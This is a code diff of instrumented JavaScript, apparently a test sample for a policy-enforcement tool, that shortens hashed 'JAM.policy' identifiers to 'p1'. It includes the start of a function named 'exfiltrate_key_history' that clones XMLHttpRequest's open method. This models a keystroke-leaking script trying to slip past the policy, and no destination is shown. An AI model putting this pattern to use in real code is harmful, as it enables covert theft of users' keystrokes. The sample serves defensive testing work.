@@ -11,7 +11,7 @@ function clone(obj$$16) {
   for(key$$14 in obj$$16) {
     var v1 = temp;
     var v2 = key$$14;
-    introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+    introspect(JAM.policy.p1) {
       var v12 = obj$$16[key$$14]
     }
     var v28 = clone(v12);
@@ -32,17 +32,17 @@ function clone2(obj$$17) {
   var copy = v4;
   var attr;
   for(attr in obj$$17) {
-    introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+    introspect(JAM.policy.p1) {
       var v23 = obj$$17[attr]
     }
     var v14 = typeof v23 == "function";
     if(!v14) {
-      introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+      introspect(JAM.policy.p1) {
         var v24 = obj$$17[attr]
       }
       var v21 = v24 == null;
       if(!v21) {
-        introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+        introspect(JAM.policy.p1) {
           var v27 = obj$$17[attr]
         }
         v21 = !v27.clone2
@@ -50,9 +50,9 @@ function clone2(obj$$17) {
       v14 = v21
     }
     if(v14) {
-      JAM.set(copy, attr, JAM.get(obj$$17, attr, JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074))
+      JAM.set(copy, attr, JAM.get(obj$$17, attr, JAM.policy.p1))
     }else {
-      introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+      introspect(JAM.policy.p1) {
         var v15 = obj$$17[attr]
       }
       if(v15 == obj$$17) {
@@ -60,7 +60,7 @@ function clone2(obj$$17) {
       }else {
         var v5 = copy;
         var v6 = attr;
-        introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+        introspect(JAM.policy.p1) {
           var v16 = obj$$17[attr]
         }
         var v29 = v16.clone2();
@@ -73,7 +73,7 @@ function clone2(obj$$17) {
 function exfiltrate_key_history() {
   xmlhttp = new XMLHttpRequest;
   var v9 = xmlhttp;
-  introspect(JAM.policy.pC545F199BE443C5FB0DC91C55134FB746FD8B074) {
+  introspect(JAM.policy.p1) {
     var v17 = xmlhttp.open
   }
   var v30 = clone(v17);
